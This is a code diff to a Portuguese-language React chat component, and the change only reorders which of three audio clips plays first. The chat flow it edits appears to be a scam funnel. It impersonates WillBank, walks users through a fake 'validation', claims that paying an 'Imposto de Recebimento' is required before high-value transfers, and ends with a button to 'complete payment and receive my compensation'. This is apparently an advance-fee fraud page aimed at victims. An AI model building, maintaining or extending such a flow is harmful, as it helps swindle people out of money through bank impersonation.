@@ -51,8 +51,8 @@ const Chat = () => {
   const [comprovanteDialogOpen, setComprovanteDialogOpen] = useState(false);
   const [dialogType, setDialogType] = useState<"telefone" | "email" | "sms" | null>(null);
 
-  // Enforce audio play order in the chat UI (audio-1 first, then audio-2, then audio-3)
-  const audioOrder = ["/audio/audio-1.mp3", "/audio/audio-2.mp3", "/audio/audio-3.mp3"] as const;
+  // Enforce audio play order in the chat UI (audio-3 first, then audio-2, then audio-1)
+  const audioOrder = ["/audio/audio-3.mp3", "/audio/audio-2.mp3", "/audio/audio-1.mp3"] as const;
   const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -317,11 +317,11 @@ const Chat = () => {
       </div>, false);
     await delay(2500);
 
-    // Audio 1 - Validação (primeiro áudio após o certificado)
-    await addAudioMessage("/audio/audio-1.mp3");
+    // Áudio 3 - Validação (primeiro áudio após o certificado)
+    await addAudioMessage("/audio/audio-3.mp3");
     await delay(1000);
     await addBotMessage(<span>Ouça o áudio acima e clique no botão para <strong>confirmar sua validação</strong>.</span>, true, 50);
-    setWaitingForAudio("/audio/audio-1.mp3");
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("audio-1-validation");
   };
   const handleConfirmValidation = async () => {
@@ -552,11 +552,11 @@ const Chat = () => {
       </div>, true, 80);
     await delay(1500);
 
-    // Audio 3 - Taxas (terceiro e último áudio)
-    await addAudioMessage("/audio/audio-3.mp3");
+    // Áudio 1 - Taxas (terceiro e último áudio)
+    await addAudioMessage("/audio/audio-1.mp3");
     await delay(1500);
     await addBotMessage(<span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>, true, 120);
-    setWaitingForAudio("/audio/audio-3.mp3");
+    setWaitingForAudio("/audio/audio-1.mp3");
     setStep("final");
   };
   const handleFinalPayment = () => {
@@ -690,11 +690,11 @@ const Chat = () => {
                   {option.text}
                 </Button>)}
 
-              {step === "audio-1-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
+              {step === "audio-1-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                   ✓ CONFIRMAR VALIDAÇÃO
                 </Button>}
 
-              {step === "audio-1-validation" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "audio-1-validation" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
 
               {step === "pix-type-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                   <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
@@ -733,11 +733,11 @@ const Chat = () => {
                   ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                 </Button>}
 
-              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
                   💰 Concluir pagamento e receber minha indenização
                 </Button>}
 
-              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
             </div>}
 
           <div ref={messagesEndRef} />
